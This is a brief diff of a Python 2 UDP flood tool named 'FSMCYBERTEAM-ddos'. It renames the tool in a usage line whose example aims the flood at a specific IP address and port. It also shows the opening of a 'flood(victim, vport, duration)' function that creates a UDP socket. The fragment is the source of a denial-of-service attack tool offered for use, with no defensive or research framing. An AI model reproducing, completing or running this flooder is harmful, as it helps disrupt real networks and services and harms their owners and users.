@@ -18,7 +18,7 @@ time.sleep(3)
 def usage():
         os.system("figlet FSMCYBERTEAM-ddos")
         print "Tool Devoloped By RONALDOİZMEDİTZ"
-        print "Usage : python2 white-ddos.py 196.220.60.200 80 100"
+        print "Usage : python2 FSMCYBERTEAM-ddos.py 196.220.60.200 80 100"
 
 def flood(victim, vport, duration):
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
